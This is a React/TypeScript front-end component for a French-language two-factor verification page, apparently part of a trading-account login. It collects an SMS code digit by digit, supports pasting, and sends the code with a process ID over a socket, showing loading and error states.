import { useState, useRef, KeyboardEvent, ChangeEvent, FormEvent } from 'react';
import { TrendingUp, ArrowLeft, ShieldCheck } from 'lucide-react';
import { getSocket } from '../hooks/useSocket';
import { useStore } from '../store/useStore';

export default function OTPPage() {
  const [digits, setDigits] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const inputs = useRef<(HTMLInputElement | null)[]>([]);

  const { processId, phoneNumber, setView } = useStore();

  function handleChange(index: number, e: ChangeEvent<HTMLInputElement>) {
    const val = e.target.value.replace(/\D/g, '').slice(-1);
    const next = [...digits];
    next[index] = val;
    setDigits(next);
    if (val && index < 5) inputs.current[index + 1]?.focus();
  }

  function handleKeyDown(index: number, e: KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputs.current[index - 1]?.focus();
    }
  }

  function handlePaste(e: React.ClipboardEvent) {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (pasted.length === 6) {
      setDigits(pasted.split(''));
      inputs.current[5]?.focus();
    }
  }

  function handleSubmit(e: FormEvent) {
    e.preventDefault();
    const tan = digits.join('');
    if (tan.length < 4) {
      setError('Code incomplet');
      return;
    }

    setError('');
    setLoading(true);

    const s = getSocket();
    s.emit('verify_otp', { processId, tan });

    s.once('authenticated', () => setLoading(false));
    s.once('tr_error', ({ message }: { message: string }) => {
      setLoading(false);
      setError(message);
      setDigits(['', '', '', '', '', '']);
      inputs.current[0]?.focus();
    });
  }

  const masked = phoneNumber.replace(/(\+\d{2})\d+(\d{3})$/, '$1••••••$2');

  return (
    <div className="gradient-bg min-h-screen flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-blue-600/20 border border-blue-500/30 mb-4">
            <TrendingUp className="w-8 h-8 text-blue-400" />
          </div>
        </div>

        <div className="card p-8">
          <button
            onClick={() => setView('login')}
            className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mb-6 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" /> Retour
          </button>

          <div className="flex items-center gap-3 mb-2">
            <ShieldCheck className="w-5 h-5 text-blue-400" />
            <h2 className="text-lg font-semibold text-white">Vérification 2FA</h2>
          </div>
          <p className="text-gray-400 text-sm mb-8">
            Entrez le code reçu par SMS au <span className="text-white font-mono">{masked}</span>
          </p>

          <form onSubmit={handleSubmit}>
            <div className="flex gap-3 justify-center mb-6" onPaste={handlePaste}>
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={el => { inputs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={e => handleChange(i, e)}
                  onKeyDown={e => handleKeyDown(i, e)}
                  className="w-12 h-14 text-center text-xl font-mono font-bold bg-bg-secondary border border-gray-700 focus:border-blue-500 rounded-xl text-white outline-none transition-colors"
                />
              ))}
            </div>

            {error && (
              <div className="bg-red-900/20 border border-red-500/30 rounded-lg px-4 py-3 text-red-400 text-sm mb-4">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading || digits.join('').length < 4}
              className="btn-primary w-full py-3 flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Vérification…
                </>
              ) : (
                'Confirmer'
              )}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
